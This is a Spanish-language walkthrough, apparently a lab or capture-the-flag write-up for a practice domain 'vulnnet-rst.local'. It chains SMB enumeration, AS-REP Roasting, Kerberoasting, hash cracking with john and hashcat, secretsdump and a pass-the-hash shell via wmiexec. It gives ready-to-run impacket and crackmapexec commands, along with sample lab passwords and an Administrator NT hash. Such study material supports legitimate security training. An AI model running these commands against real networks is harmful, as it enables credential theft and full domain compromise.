<h1 align="center"> Pasos para detectar la vulnerabilidad pass the hash </h2>

<p align="center">  [ ! ] Para una mejor comprension te invito a investigar el material de contenido para estudio:  </p> 

---

<br>

<p align="center">
  <img src="https://i.pinimg.com/originals/ee/e8/43/eee8431910fbcdaa786ddd7b7a56c44e.gif" width="400" height="auto">
</p>

---

<h3 align="center"> Descubrimiento de recursos compartidos  </h3>

<br>

-  Una vez identificado el dominio de la maquina la cual quieres vulnerar agregalo en el archivo del directorio /etc/hosts en ejemplo:

<p align="center">
  <img src="https://github.com/user-attachments/assets/c11352e4-5990-423a-994b-3f5c97aaa6e8" width="600" height="auto">
</p>

<br>

<h3 align="center"> Enumeracion de SIDs o usuarios potenciales </h3>

<br>

- 1 - Enumerar SIDs con alguna herramienta de peticiones al controlador de dominio y de manera paralela investigar en el servicio smb sin un usuario y contraseña recursos compartidos esto algunas veces puede apoyarte en encontrar potenciales victimas (en el punto 2 esta el comando para enumerar recursos sin un usuario y contraseña)

<br>

```bash
impacket-lookupsid guest@<Dominio o IP> -no-pass
```

<br>

- 2 - Crear una lista de potenciales posibles usuarios con sus respectivas contraseñas los cuales tengan recursos compartidos en smb

<br>

*smbmap:*

```bash
# Sin contraseña

smbmap -u 'null' -H <ip_victima>

# Con contraseña

smbmap -u '<usuario>' -p '<contraseña>' -H 10.10.217.157
```

<br>

*smbclient:*

```bash
# Sin contraseña

smbclient -L ////<ip_victima>// -N

# con contraseña

smbclient -L <ip_victima> --user <usuario_victima> --password <contraseña>

```

<br>

<h3 align="center"> Ejecutando un ataque "AS-REP Roasting" sobre el controlador de dominio </h3> 

<br>

- 1 - Una vez recolectada la informacion recreamos un ataque "AS-REP Roasting" para los usuarios que tienen deshabilitada la pre-authentication de Kerberos,enviando paticiones a el controlador de dominio el cual responde con un hash AS-REP. Esta respuesta contiene información cifrada que puede ser utilizada para intentar crackear la contraseña del usuario.

<br>

*impacket:*

```bash
impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile <archivo_con_usuarios>
```

<br>

- Si un hash es encontrado copiarlo en un archivo completo tal y como se muestra en la imagen para crackearlo, el nombre de usuario sobre el cual se identifico el hash puedes encontrarlo en las primeras palabras en este caso "t-skid"

<p align="center">
  <img src="https://github.com/user-attachments/assets/8b7895f5-d2d4-419d-a47f-82e9bd0eaab5" width="600" height="auto">
</p>

<br>

*john:*

```bash
john --wordlist=/<ruta_del_diccionario/rockyou.txt <nombre_del_archivo>

# ejemplo
# john --wordlist=/usr/share/wordlist/rockyou.txt archivo_hash
```

<br>

*hashcat:*

```bash
hashcat -m 18200 <nombre_del_archivo> <ruta_del_diccionario>

# ejemplo
# hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

<br>

- 2  Una vez crackeado el hash enviamos una peticion al servicio smb verificando asi que exista en el dominio

<br>

```bash
crackmapexec smb 10.10.39.193 -u '<usuario>' -p '<contraseña>'

# ejemplo
# crackmapexec smb 10.10.39.193 -u 't-skid' -p 'tj072889*'
```

<br>

<h3 align="center"> Ejecutando un ataque "Kerberoasting" sobre el controlador de dominio </h3> 

<br>

- 1 - Este tipo de ataque está diseñado para extraer tickets de servicio (Service Principal Names, SPNs) de un dominio Active Directory el cual se utilizan en el protocolo de autenticación Kerberos. Los tickets TGS obtenidos pueden ser utilizados para intentar descifrar las contraseñas de las cuentas de servicio, las cuales frecuentemente tienen altos privilegios.
  
<br> 

```bash
impacket-GetUserSPNs '<dominio>/<usuario>:<contraseña>' -request

# ejemplo
# impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -request
```

<br>

- el ticket tgs debe ser copiado todo tal y como se muestra en la imagen en el recuadro rojo ya que es un hash "Kerberos TGS-REP" el cual debe ser crackeado con alguna herramienta de decifrado de hash 

<p align="center">
  <img src="https://github.com/user-attachments/assets/fa2e993f-8c29-4d72-b56e-4a368597be7a" width="600" height="auto">
</p>

<br>

*john:*

```bash
john --wordlist=/<ruta_del_diccionario/rockyou.txt <nombre_del_archivo>

# ejemplo
# john --wordlist=/usr/share/wordlist/rockyou.txt archivo_hash
```

<br>

- 2 - Una vez crackeado el hash enviamos una peticion al servicio smb verificando asi que exista en el dominio

<br>

*crackmapexec:*

```bash
crackmapexec smb 10.10.39.193 -u '<usuario>' -p '<contraseña>'

# ejemplo
# crackmapexec smb 10.10.39.193 -u 't-shark' -p 'tj07adad'
```

<br>

<h3 align="center"> Ejecutando un ataque "Pass-the-hash" sobre el controlador de dominio </h3> 

<br>

- 1 - Con acceso a una cuenta de servicio con altos privilegios, un atacante puede dumpear los hashes de todos los usuarios desde el Security Account Manager (SAM) 

<br>

*impacket:*

```bash
impacket-secretsdump <dominio>/<usuario>:<contraseña>@<IP>

# ejemplo
# impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.49.7
```

<br>

- 2 - al recibir hashes del siguiente tipo "LM Hash (LAN Manager Hash)" y "NT Hash (NT LAN Manager Hash)" los cuales debes elegir el usuario sobre el cual quieres recibir una terminal windows recreando el ataque "pass-the-hash", copiar y pegar como en la siguiente imagen en el comando de la herramienta deseada

<p align="center">
  <img src="https://github.com/user-attachments/assets/7b35c164-c107-4fbd-a525-2707581e36f1" width="800" height="auto">
</p>

<br>

*impacket:*

```bash
impacket-wmiexec <dominio>/<usuario>@<ip> -hashes <hash>

# ejemplo
# impacket-wmiexec vulnnet-rst.local/Administrator@10.10.49.7 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
```




   

 
